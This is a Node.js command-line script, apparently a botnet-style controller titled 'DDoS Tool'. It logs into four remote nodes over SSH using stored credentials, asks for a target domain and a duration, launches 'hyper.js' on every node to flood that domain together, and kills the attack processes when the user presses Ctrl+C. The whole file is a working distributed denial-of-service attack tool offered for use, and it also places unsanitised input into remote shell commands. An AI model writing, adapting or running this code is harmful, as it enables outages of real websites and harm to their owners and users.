var ssh = require('ssh2');
var conn = new ssh.Client();
var conn2 = new ssh.Client();
var conn3 = new ssh.Client();
var conn4 = new ssh.Client();
var readline = require('readline');
var rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

process.stdout.write('\033c');
process.title = 'DDoS Tool';

var figlet = require('figlet');
figlet.text('DDoS Tool', function(err, data) {
    console.log(data);
    console.log(" --------------------------------------------\n");
});

const config = require("./config.json")

conn.connect({
    host: config.node1.host,
    port: 22,
    username: config.node1.username,
    password: config.node1.password,
});
conn2.connect({
    host: config.node2.host,
    port: 22,
    username: config.node2.username,
    password: config.node2.password,
});
conn3.connect({
    host: config.node3.host,
    port: 22,
    username: config.node3.username,
    password: config.node3.password,
});
conn4.connect({
    host: config.node4.host,
    port: 22,
    username: config.node4.username,
    password: config.node4.password,
});
conn.on('ready', function() {
    console.log(" [/] Connecting to Node 1...")
        setTimeout(function() {
            console.log(" [/] Connected to Node 1")
        }, 5000)
    }
)
conn2.on('ready', function() {
    console.log(" [/] Connecting to Node 2...")
        setTimeout(function() {
            console.log(" [/] Connected to Node 2")
        }, 5000)
    }
)
conn3.on('ready', function() {
    console.log(" [/] Connecting to Node 3...")
        setTimeout(function() {
            console.log(" [/] Connected to Node 3")
        }, 5000)
    }
)
conn4.on('ready', function() {
    console.log(" [/] Connecting to Node 4...")
        setTimeout(function() {
            console.log(" [/] Connected to Node 4")
        }, 5000)
    }
)

conn.on("error", function(err) {
    console.log(" [/] Error connecting to Node 1")
})
conn2.on('error', function(err) {
    console.log(" [/] Error connecting to Node 2")
})
conn3.on('error', function(err) {
    console.log(" [/] Error connecting to Node 3")
})
conn4.on('error', function(err) {
    console.log(" [/] Error connecting to Node 4")
})

setTimeout(function() {
    rl.question('\n [/] Domain: ', function(domain) {
        rl.question(' [/] Time: ', function(time) {
            conn.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                console.log(" [/] Starting DDoS attack...")
                setTimeout(function() {
                    console.log(` [/] DDoS Attack started on ${domain} for ${time} seconds`)
                }
                , 1000)
                conn2.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                    conn3.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                        conn4.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                        })
                    })
                })
                process.stdin.on('keypress', function(chunk, key) {
                    if (key.ctrl && key.name === 'c') {
                        conn.exec('killall node', function(err, stream) {
                            console.log(" [/] Stopped processes")
                        })
                        conn2.exec('killall node', function(err, stream) {
                        })
                        conn3.exec('killall node', function(err, stream) {
                        })
                        conn4.exec('killall node', function(err, stream) {
                        })
                    }
                })
            })
            setTimeout(function() {
                console.log(" [/] Attack ended")
            }, time * 1000);
        })
    })
}
, 7000);